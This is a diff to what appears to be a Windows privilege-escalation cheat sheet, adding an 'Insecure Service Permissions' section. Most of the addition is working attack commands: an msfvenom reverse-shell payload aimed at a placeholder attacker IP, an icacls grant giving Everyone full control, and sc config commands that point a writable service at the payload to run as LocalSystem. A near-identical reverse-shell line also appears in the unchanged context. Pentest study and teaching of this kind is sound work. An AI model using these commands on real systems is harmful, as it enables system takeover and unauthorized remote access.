@@ -9,6 +9,7 @@
 * [AlwaysInstallElevated](#alwaysinstallelevated)
 * [Insecure Permissions on Service Executable](#insecure-permissions-on-service-executable)
 * [Unquoted Service Paths](#unquoted-service-paths)
+* [Insecure Service Permissions](#insecure-service-permissions)
 
 *********************************************************************************
 Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
@@ -157,6 +158,32 @@ If there is is a program installed on the machine in a folder that is world writ
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=[ATTACK-PORT] -f exe-service -o [FILE-NAME].exe
 ```
+
+********************************************
+
+## Insecure Service Permissions
+
+* Use Accesschk from the Sysinternals suite to check for a service's DACL: https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
+* Check the "BUILTIN\Users" group for "SERVICE_ALL_ACCESS" permission
+* If the "SERVICE_ALL_ACCESS" permission exists, start a listener and create a malicious payload:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=[ATTACK-PORT] -f exe-service -o [FILE-NAME].exe
+```
+* Transfer the malicious payload to the target machine and grant full control to everyone:
+```
+icacls [MALICIOUS-PAYLOAD-PATH] /grant Everyone:F
+```
+* Change the service's associated executable and account with:
+```
+sc config [VULNERABLE-SERVICE] binPath= "[MALICIOIUS-PAYLOAD-PATH" obj= LocalSystem
+```
+```
+sc stop [VULNERABLE-SERVICE]
+```
+```
+sc start [VULNERABLE-SERVICE]
+```
+* A shell should spawn on the attack machine
 
 ********************************************
 
